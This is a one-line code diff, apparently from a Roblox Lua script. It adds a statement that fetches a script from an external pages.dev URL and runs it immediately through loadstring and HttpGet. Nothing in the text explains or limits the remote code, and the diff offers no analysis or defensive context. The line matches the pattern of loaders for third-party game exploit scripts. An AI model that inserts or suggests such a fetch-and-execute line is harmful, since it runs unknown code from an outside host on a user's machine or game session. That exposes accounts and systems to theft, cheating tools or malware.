@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://zerithstudios.pages.dev/jnk?ts=1792546607&sig=e028a7f14e9e9a6f5bcaa1a2d165b5f549f85a9cda52dfdfc1b14ffdf4330bed"))()
